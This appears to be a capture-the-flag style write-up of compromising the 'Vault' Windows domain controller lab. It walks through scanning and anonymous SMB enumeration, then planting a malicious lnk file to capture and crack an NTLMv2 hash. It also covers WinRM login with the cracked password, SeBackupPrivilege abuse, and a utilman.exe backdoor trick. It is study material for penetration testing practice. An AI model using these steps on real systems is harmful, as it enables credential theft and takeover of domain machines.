## NMAP

```
??$ nmap -sC -sV 192.168.53.172 -oA Vault -p- -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 14:19 UTC
Stats: 0:02:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 14:22 (0:00:16 remaining)
Nmap scan report for 192.168.53.172
Host is up (0.0015s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-11 14:21:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-08-11T14:22:05+00:00
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2024-08-02T13:31:37
|_Not valid after:  2025-02-01T13:31:37
|_ssl-date: 2024-08-11T14:22:44+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-08-11T14:22:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.55 seconds
```

## PORT 5985

HTTP 404

## PORT 53

No luck

## SMB

Null session listed shares
```
??$ smbclient -N -L //192.168.53.172

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DocumentsShare  Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
```

Enumerated DocumentsShare but it was empty

```
??$ smbclient -N \\\\192.168.53.172\\DocumentsShare
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 19 08:59:02 2021
  ..                                  D        0  Fri Nov 19 08:59:02 2021

                7706623 blocks of size 4096. 771342 blocks available
```


Maybe upload a malicious lnk file or something for responder to grab a hash

[[LLMNR Poisoning]]

New hash captured for user anirudh:

```
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:d7756194828fefb7:8FEFE235723B32F2F71FBFBD2BD9ADF5:010100000000000000EF39A1FEEBDA0129F457E9EEE5F1F10000000002000800300032005200450001001E00570049004E002D0051005600330033004400420047004400480032004F0004003400570049004E002D0051005600330033004400420047004400480032004F002E0030003200520045002E004C004F00430041004C000300140030003200520045002E004C004F00430041004C000500140030003200520045002E004C004F00430041004C000700080000EF39A1FEEBDA010600040002000000080030003000000000000000010000000020000089AA92A8AA17227674842877BD92C0EEF101C15360BF57E99844B804AA2DA3E00A001000000000000000000000000000000000000900140063006900660073002F005600410055004C0054000000000000000000
```

Cracked:

```
???(kali?kali)-[~/lnkbomb]
??$ john --show --format=netntlmv2 hash
anirudh:SecureHM:VAULT:d7756194828fefb7:8FEFE235723B32F2F71FBFBD2BD9ADF5:010100000000000000EF39A1FEEBDA0129F457E9EEE5F1F10000000002000800300032005200450001001E00570049004E002D0051005600330033004400420047004400480032004F0004003400570049004E002D0051005600330033004400420047004400480032004F002E0030003200520045002E004C004F00430041004C000300140030003200520045002E004C004F00430041004C000500140030003200520045002E004C004F00430041004C000700080000EF39A1FEEBDA010600040002000000080030003000000000000000010000000020000089AA92A8AA17227674842877BD92C0EEF101C15360BF57E99844B804AA2DA3E00A001000000000000000000000000000000000000900140063006900660073002F005600410055004C0054000000000000000000
```

Used Evil-winrm to connect:

```
evil-winrm -i 192.168.53.172 -u anirudh -p SecureHM
```

## Privilege escalation

WHOAMI shows some interesting token privileges:

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

Based on [Abusing Tokens](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokensa)
Used seBackupPrivilege to modify ACL on C:/Users/Administrator and access proof.txt

Used script from [PsCabesha-Tools](https://github.com/Hackplayers/PsCabesha-tools/tree/master/Privesc)

Specifically [seBackupPrivilege](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)

==DONE==

Could have also done:

```
- By replacing `utilman.exe` with `cmd.exe`, we can access the Command Prompt from the Windows login screen without needing to log in.
- This means that if we reboot or logout from the machine and press Windows Key + U at the login screen, instead of opening the Utility Manager, the system will launch the Command Prompt with system privileges.
```



